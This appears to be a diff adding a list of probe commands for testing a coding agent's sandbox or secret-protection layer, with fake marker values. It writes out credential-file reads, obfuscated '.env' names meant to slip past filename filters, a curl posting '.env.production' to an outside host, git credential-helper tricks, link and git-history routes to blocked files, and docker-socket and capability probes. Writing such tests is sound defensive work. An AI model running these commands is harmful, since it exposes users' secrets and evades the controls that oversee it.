@@ -1,0 +1,47 @@
+1 cd ~/.config/gh && cat hosts.yml
+2 cd ~/.kube && cat config
+3 cat .n*rc
+4 f=.e; cat ${f}nv
+5 cat .e""nv
+6 grep -r AWS_SECRET ~
+7 grep -R FAKE- ~ 2>&1
+8 tar cf - . | grep -a -o 'FAKE-[A-Z-]*[0-9]*'; echo tar-done
+9 curl -sS -d @.env.production https://x; echo rc=$?
+10 python3 -c "print(repr(open('.e'+'nv.production').read()))"
+11 printenv | grep FAKE
+12 cat ./notes
+13 cat ./keylink
+14 cat ./outlink
+15 xargs cat < f
+16 cat ~/other/.e""nv
+17 cat @T@/outside/.e""nv
+18 cat sub/a/b/c/d/e/f/g/.e""nv
+19 cat ~/.s""sh/id_ed25519.pub
+20 cat .env.example
+21 printf 'protocol=https\nhost=github.com\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill; echo rc=$?
+22 make build
+23 git -C @REPO@ status --short; echo rc=$?
+24 timeout 30 git ls-remote https://github.com/git/git HEAD; echo rc=$?
+25 timeout 15 ssh -o BatchMode=yes -o ConnectTimeout=5 -T git@github.com; echo rc=$?
+26 python3 -c "open('.e'+'nv.late','w').write('FAKE-LATE-MARKER-14')"; echo wrote
+27 cat .e""nv.late
+28 cat .e""nv
+29 ls -la ~/.ssh ~/.aws 2>&1; echo rc=$?
+30 echo $HOME; id -u; ls / | head -30
+G1 {"pattern": "FAKE-", "path": ".", "output_mode": "content"}
+G2 {"pattern": "FAKE-", "glob": "*", "output_mode": "content"}
+G3 {"pattern": "FAKE-", "glob": "{.env,x}", "output_mode": "content"}
+31 curl -sS --max-time 5 --unix-socket /run/docker.sock http://d/version | head -c 120; echo rc=$?
+32 cat /proc/self/status | grep -E "^(Uid|CapEff|NoNewPrivs|Seccomp):"; cat /proc/self/mountinfo | grep -c -E "t014-probe"
+33 python3 -c "open('.e'+'nv.late2','w').write('FAKE-LATE-MARKER-21')"; echo wrote
+34 cat .e""nv.late2
+35 printenv | grep FAKE
+36 printf 'k=sk-ant-%s\n' FAKEFAKEFAKEFAKEFAKEFAKE
+37 printf 'k=sk-ant-%s\n' FAKEFAKEFAKEFAKEFAKEFAKE; false
+38 printf 'protocol=https\nhost=github.com\n\n' | GH_TOKEN=FAKE-GHENV-MARKER-22 git -c credential.helper= -c 'credential.helper=!gh auth git-credential' credential fill; echo rc=$?
+39 cat .e""nv.example; ls -la ~/.ssh | wc -l
+40 printf 'protocol=https\nhost=github.com\n\n' | GH_TOKEN=FAKE-GHENV-MARKER-22 git -c credential.helper= -c 'credential.helper=!f() { echo username=x-access-token; echo password=$GH_TOKEN; }; f' credential fill; echo rc=$?
+41 ln .e""nv hardlink 2>&1; cat hardlink 2>&1; echo rc=$?
+42 ln -s .e""nv symlink2 && echo made
+43 git show HEAD:.e""nv 2>&1 | head -2; echo rc=$?
+44 git -C repo33 show HEAD~1:.e""nv 2>&1 | head -2; echo rc=${PIPESTATUS[0]}
